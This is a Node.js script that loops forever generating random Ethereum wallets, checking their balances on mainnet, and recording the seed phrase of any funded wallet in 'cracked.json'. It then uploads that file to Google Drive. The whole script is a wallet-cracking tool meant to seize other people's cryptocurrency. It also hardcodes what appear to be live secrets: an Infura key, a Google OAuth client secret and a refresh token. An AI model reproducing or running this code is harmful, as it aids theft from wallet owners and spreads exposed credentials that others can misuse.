const { google } = require('googleapis');
const fs = require('fs/promises');
const { OAuth2 } = google.auth;
const ethers = require('ethers');

const API_ENDPOINT = 'https://mainnet.infura.io/v3/74bfb53e63c24453aa7e4fa599ecc3f6'; // replace with your API endpoint URL
const provider = new ethers.providers.JsonRpcProvider(API_ENDPOINT);

// Replace the values below with your Google Drive credentials
const CLIENT_ID = '427538496002-i0scorf9dtf2nsefgp1d3cf12m0qn9gk.apps.googleusercontent.com';
const CLIENT_SECRET = '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';
const REDIRECT_URI = 'https://developers.google.com/oauthplayground';
const REFRESH_TOKEN = '1//04T67uX7knBIFCgYIARAAGAQSNwF-L9Irfc0piUz7ii1x3ZaymIQl9zXJgYerUSTeiDwK0l4ar3qAPrzoX7DiEyqS0TPw5eGjQl0';
const FILE_ID = '19S3WN0zSZET1b_Nc5oWZZeZgPpKULeWl';

const oauth2Client = new OAuth2(CLIENT_ID, CLIENT_SECRET, REDIRECT_URI);
oauth2Client.setCredentials({
  refresh_token: REFRESH_TOKEN
});

const drive = google.drive({
  version: 'v3',
  auth: oauth2Client
});

async function updateDriveFile(fileId, data) {
  await drive.files.update({
    fileId: fileId,
    media: {
      mimeType: 'application/json',
      body: data
    }
  });
}

async function main() {
  while (true) {
    let wallet = ethers.Wallet.createRandom(); // create a new wallet
    let mnemonic = wallet.mnemonic.phrase; // mnemonic
    let address = wallet.address; // address
    let balance = await provider.getBalance(wallet.address); // balance
    console.log(ethers.utils.formatEther(balance));

    if (!balance.isZero()) { // found ether in wallet
      let crackedData;
      try {
        let data = await fs.readFile('./cracked.json', 'utf8'); // read from json file
        crackedData = JSON.parse(data);
      } catch (err) {
        throw err;
      }

      crackedData[address] = { "mnemonic": mnemonic, "balance": ethers.utils.formatEther(balance) };
      await fs.writeFile('./cracked.json', JSON.stringify(crackedData, null, 4), 'utf8'); // write to json file

      const fileContent = JSON.stringify(crackedData, null, 4);
      await updateDriveFile(FILE_ID, fileContent); // update file on Google Drive
    }
  }
}

main();
